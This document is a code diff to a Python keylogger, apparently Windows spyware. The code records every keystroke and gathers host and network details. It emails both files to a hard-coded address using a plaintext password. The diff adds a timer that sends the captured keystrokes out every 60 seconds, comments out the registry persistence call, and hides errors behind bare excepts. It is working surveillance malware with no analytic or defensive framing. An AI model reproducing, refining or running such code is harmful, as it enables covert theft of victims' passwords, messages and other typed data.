@@ -14,7 +14,7 @@ import winreg
 import psutil
 import uuid
 import re
-
+from threading import Timer
 
 keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
@@ -28,6 +28,7 @@ password = "amlfuahzumbkooxi"
 
 
 def send_email(filename, attachment, toaddr):
+    print("przygotowanie maila")
     fromaddr = email_address
     msg = MIMEMultipart()
     msg['From'] = fromaddr
@@ -71,7 +72,7 @@ def computer_information():
         Hostname: {socket.gethostname()}
         """)
 
-        f.write("----------------INTETFACE ADDRESS--------------------\n")
+        f.write("----------------INTERFACE ADDRESS--------------------\n")
         if_addrs = psutil.net_if_addrs()
         for interface_name, interface_addresses in if_addrs.items():
             for address in interface_addresses:
@@ -99,11 +100,13 @@ def on_press(key):
         keys = []
 
 
-def on_release(key):
-    if key == Key.esc:
-        send_email(keys_information, file_path +
-                   extend + keys_information, toaddr)
-        delete_keys_information()
+# def on_release(key):
+#         timer = Timer(interval=60, function=send_email(keys_information, file_path + extend + keys_information, toaddr))
+#         timer.daemon = True
+#         timer.start()
+#         send_email(keys_information, file_path +
+#                    extend + keys_information, toaddr)
+#         delete_keys_information()
 
 
 def write_file(keys):
@@ -134,6 +137,7 @@ def write_file(keys):
                 f.write(key)
             else:
                 f.write(str(key).replace("'", ""))
+    
 
 
 
@@ -166,18 +170,33 @@ def add_to_registry():
     winreg.CloseKey(open)
 
 
+
+def schedule():
+    timer = Timer(interval=60, function=schedule)
+    timer.daemon = True
+    timer.start()
+    send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+
+
 def main():
     try:
-        add_to_registry()
-        computer_information()
+        #add_to_registry()
+        try: 
+            computer_information()
+        except:
+            pass
         send_email(system_information, file_path +
                    extend + system_information, toaddr)
         delete_system_inforamtion()
     except:
         pass
-
-    with Listener(on_press=on_press, on_release=on_release) as listener:
+    with open(file_path + extend + keys_information, "w") as f:
+        f.write("Start")
+    schedule()       
+    with Listener(on_press=on_press) as listener:
         listener.join()
+        
        
 
 if __name__ == '__main__':
